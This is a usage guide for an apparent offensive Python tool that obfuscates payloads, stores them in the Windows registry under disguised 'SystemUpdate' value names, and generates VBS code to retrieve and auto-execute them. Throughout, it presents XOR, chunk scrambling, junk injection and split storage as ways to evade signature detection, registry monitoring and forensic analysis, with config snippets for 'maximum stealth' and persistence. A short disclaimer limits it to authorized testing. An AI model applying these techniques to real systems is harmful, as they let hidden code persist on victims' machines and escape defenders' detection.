# Registry Value Obfuscator - Complete Guide

## Overview

The Registry Obfuscator provides advanced techniques for storing and retrieving obfuscated payloads in Windows registry, evading detection through multiple encoding strategies.

## Features

### Obfuscation Types

#### 1. **BINARY Obfuscation**
Stores payload as binary data with optional junk injection

**Characteristics:**
- Converts payload to hex representation
- Stores as REG_SZ value (VBS limitation)
- Adds random junk data at random offset
- Stores offset and size metadata

**Use Case:**
- Maximum stealth for binary payloads
- Evades signature detection through junk injection

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.BINARY,
    add_junk_data=True,
    junk_ratio=0.3
)
```

**Registry Values Generated:**
- `PayloadData` - Hex-encoded payload + junk
- `PayloadOffset` - Offset to actual payload
- `PayloadSize` - Size of actual payload

---

#### 2. **HEX_STRING Obfuscation**
Direct hex encoding with interleaved junk data

**Characteristics:**
- Simple hex-to-ASCII conversion
- Junk bytes interspersed in hex string
- Smaller storage footprint than binary

**Use Case:**
- Balance between stealth and storage efficiency
- Registry monitoring evasion

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.HEX_STRING,
    add_junk_data=True,
    junk_ratio=0.4
)
```

**Registry Values Generated:**
- `PayloadHex` - Hex-encoded payload with junk

---

#### 3. **SPLIT_VALUES Obfuscation**
Distributes payload across multiple registry values

**Characteristics:**
- Chunks payload into smaller pieces
- Stores each chunk in separate registry value
- Optional chunk order scrambling
- Junk chunks can be added for confusion

**Use Case:**
- Evade single-value size limits
- Distributed storage for forensic evasion
- Large payload handling

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.SPLIT_VALUES,
    chunk_size=128,
    scramble_order=True,
    add_junk_data=True
)
```

**Registry Values Generated:**
- `Chunk000`, `Chunk001`, ... - Payload chunks
- `Index000`, `Index001`, ... - Original chunk indices
- `ChunkCount` - Number of payload chunks (excluding junk)

---

#### 4. **INTERLEAVED Obfuscation**
Interleaves payload bytes with junk data

**Characteristics:**
- Random junk byte insertion
- Mask array stores byte positions
- Reconstruction via mask lookup

**Use Case:**
- Memory dump detection evasion
- Forensic analysis confusion

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.INTERLEAVED,
    junk_ratio=0.3
)
```

**Registry Values Generated:**
- `InterleavedData` - Hex string with junk
- `InterleavedMask` - Comma-separated byte positions

---

#### 5. **XORED Obfuscation**
XOR encoding with configurable or random key

**Characteristics:**
- Single-byte XOR key
- Fast encoding/decoding
- Key stored separately
- 255 unique keys available

**Use Case:**
- Quick obfuscation for polymorphic payloads
- Signature evasion through key variation

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.XORED,
    xor_key=0x42  # Fixed key
)

# Or with random key:
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.XORED
)
```

**Registry Values Generated:**
- `XoredPayload` - XOR-encoded hex string
- `XorKey` - XOR key value

---

#### 6. **BASE64 Obfuscation**
Standard base64 encoding with chunking

**Characteristics:**
- Standard base64 alphabet
- Splits long payloads into parts
- MSXML decoder in retrieval code
- High compatibility

**Use Case:**
- Compatibility with legacy systems
- Integration with PowerShell payloads

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.BASE64,
    add_junk_data=True
)
```

**Registry Values Generated:**
- `Base64Part0`, `Base64Part1`, ... - Payload chunks
- `Base64PartCount` - Number of chunks

---

#### 7. **CHUNKED_HEX Obfuscation**
Hex encoding split into multiple values

**Characteristics:**
- Similar to SPLIT_VALUES but simpler
- Each chunk is hex-encoded independently
- Smaller per-value overhead

**Use Case:**
- Alternative to split values
- Better compatibility with monitoring tools

**Example:**
```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.CHUNKED_HEX,
    chunk_size=64
)
```

**Registry Values Generated:**
- `HexChunk000`, `HexChunk001`, ... - Hex chunks
- `HexChunkCount` - Number of chunks

---

## Usage Examples

### Basic Usage

```python
from registry_obfuscator import RegistryObfuscator, ObfuscationConfig, ObfuscationType

# Create obfuscator
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.BINARY,
    add_junk_data=True,
    junk_ratio=0.3
)
obfuscator = RegistryObfuscator(config)

# Obfuscate payload
payload = "powershell.exe -NoProfile -Command 'Write-Host Hello'"
result = obfuscator.obfuscate(payload)

# Access results
registry_values = result['registry_values']  # Dict[str, Tuple[str, str]]
metadata = result['metadata']                # Deobfuscation metadata
retrieval_code = result['retrieval_code']    # VBS code to retrieve
```

### VBS Code Generation

```python
from registry_obfuscator import RegistryStorageGenerator

generator = RegistryStorageGenerator(obfuscator)

# Generate storage code
storage_vbs = generator.generate_storage_vbs(
    payload=payload,
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
    value_prefix="SystemUpdate"
)

# Generate retrieval code
retrieval_vbs = generator.generate_retrieval_vbs(
    registry_hive="HKCU",
    registry_path="Software\\Microsoft\\Windows\\CurrentVersion",
    value_prefix="SystemUpdate",
    auto_execute=True
)
```

### Configuration Options

```python
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.SPLIT_VALUES,
    chunk_size=256,              # Size of chunks (bytes)
    add_junk_data=True,          # Add junk data
    junk_ratio=0.3,              # Junk/payload ratio
    xor_key=None,                # XOR key (None = random)
    scramble_order=True,         # Randomize chunk order
    compression=False            # Placeholder for future use
)
```

---

## Registry Structure Examples

### BINARY Example
```
HKCU\Software\Microsoft\Windows\CurrentVersion
  SystemUpdate_PayloadData = "1184b1e3706f7765727368656c6c2e657865202d436f6d..."
  SystemUpdate_PayloadOffset = "4"
  SystemUpdate_PayloadSize = "41"
```

### SPLIT_VALUES Example
```
HKCU\Software\Microsoft\Windows\CurrentVersion
  SystemUpdate_Chunk000 = "84ec2c3270bee9df3a3d6ce438f00232..."
  SystemUpdate_Index000 = "1"
  SystemUpdate_Chunk001 = "706f7765727368656c6c2e657865202d..."
  SystemUpdate_Index001 = "0"
  SystemUpdate_ChunkCount = "2"
```

### XORED Example
```
HKCU\Software\Microsoft\Windows\CurrentVersion
  SystemUpdate_XoredPayload = "f5eaf2e0f7f6ede0e9e9abe0fde0a5a..."
  SystemUpdate_XorKey = "133"
```

---

## VBS Retrieval Functions

Each obfuscation type generates a corresponding VBS function:

- `RetrieveBinaryPayload(shell, regPath)`
- `RetrieveHexStringPayload(shell, regPath)`
- `RetrieveSplitPayload(shell, regPath)`
- `RetrieveInterleavedPayload(shell, regPath)`
- `RetrieveXoredPayload(shell, regPath)`
- `RetrieveBase64Payload(shell, regPath)`
- `RetrieveChunkedHexPayload(shell, regPath)`

All functions:
- Accept WScript.Shell object and registry path
- Return decoded/deobfuscated payload string
- Include error handling (On Error Resume Next)
- Are self-contained (no external dependencies)

---

## Performance Considerations

### Storage Size Comparison
(For same 41-byte payload)

| Type | Storage Size | Chunks | Notes |
|------|-------------|--------|-------|
| Binary | 100 bytes | 1 | Hex doubles size + junk |
| Hex String | 82 bytes | 1 | Simple overhead |
| Split (64B) | 82 bytes | 1 | Small payloads fit in 1 chunk |
| Interleaved | 85 bytes | 1 | Mask overhead |
| Xored | 82 bytes | 1 | No overhead |
| Base64 | 56 bytes | 1 | Compression factor 1.33 |
| Chunked Hex | 82 bytes | 1 | Same as hex |

### VBS Execution Speed

**Fastest to Slowest:**
1. Xored (single byte operation)
2. Hex String (simple loop)
3. Base64 (MSXML parsing)
4. Interleaved (mask lookup)
5. Split Values (concatenation)
6. Chunked Hex (multiple values)
7. Binary (offset calculation)

---

## Detection Evasion Techniques

### 1. Junk Data
- Random bytes inserted at random offsets
- Increases storage size
- Confuses pattern recognition

### 2. Chunk Scrambling
- Randomizes chunk order
- Requires index lookup for reconstruction
- Defeats sequential analysis

### 3. Multiple Encodings
- Layering obfuscation types
- Different key values each run
- Polymorphic signatures

### 4. Distributed Storage
- Payload split across values
- Registry monitor confusion
- Exceeds value size limits

### 5. XOR Key Variation
- Different key per obfuscation
- 255 unique variants
- Signature variation

---

## Best Practices

### For Maximum Stealth
```python
# Layered obfuscation
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.SPLIT_VALUES,
    chunk_size=256,
    scramble_order=True,
    add_junk_data=True,
    junk_ratio=0.4
)
```

### For Compatibility
```python
# Maximum compatibility
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.BASE64,
    add_junk_data=False
)
```

### For Large Payloads
```python
# Distributed storage
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.CHUNKED_HEX,
    chunk_size=512,
    scramble_order=True
)
```

### For Speed
```python
# Fast decoding
config = ObfuscationConfig(
    obfuscation_type=ObfuscationType.XORED,
    xor_key=random.randint(1, 255)
)
```

---

## Security Notes

⚠️ **For Authorized Security Research Only**

This tool is designed for:
- Authorized penetration testing
- Security research and training
- Red team exercises
- Defensive research

**Not** for:
- Unauthorized access to systems
- Malware development
- Illegal payload delivery

---

## Integration with Existing Tools

### Combine with Payload Generator
```python
from payload_generator import PayloadGenerator
from registry_obfuscator import RegistryObfuscator, ObfuscationConfig

# Generate base payload
pg = PayloadGenerator()
payload = pg.generate("cmd.exe", technique="base64")

# Obfuscate for registry
config = ObfuscationConfig(obfuscation_type=ObfuscationType.SPLIT_VALUES)
obfuscator = RegistryObfuscator(config)
result = obfuscator.obfuscate(payload)
```

### Combine with VBS Encoder
```python
from vbs_encoder import VBSEncoder
from registry_obfuscator import RegistryStorageGenerator

encoder = VBSEncoder()
obfuscator = RegistryObfuscator(config)
generator = RegistryStorageGenerator(obfuscator)

# Generate complete payload
vbs = generator.generate_storage_vbs(
    payload,
    registry_hive="HKCU",
    registry_path="Software\\Test"
)
```

---

## Testing

Run the test suite:
```bash
python3 -m unittest test_registry_obfuscator -v
```

Run demo:
```bash
python3 registry_obfuscator.py
```

---

## Troubleshooting

### Registry Write Failures
- Check permissions for target hive (HKLM requires admin)
- Use HKCU for user-level persistence
- Verify path exists

### Retrieval Failures
- Ensure registry values were written successfully
- Check value names match storage code
- Verify VBS has registry read permissions

### Large Payload Issues
- Use CHUNKED_HEX or SPLIT_VALUES
- Reduce chunk size if needed
- Monitor total registry size

---

## Future Enhancements

- [ ] Compression support
- [ ] Multi-layer encryption
- [ ] Time-delayed decoding
- [ ] Registry path obfuscation
- [ ] Anti-analysis detection
- [ ] Stealth cleanup routines

---

## References

- Windows Registry Structure
- VBS Registry API (RegRead, RegWrite)
- MSXML Base64 Decoding
- XOR Encryption Basics
- Registry Forensics

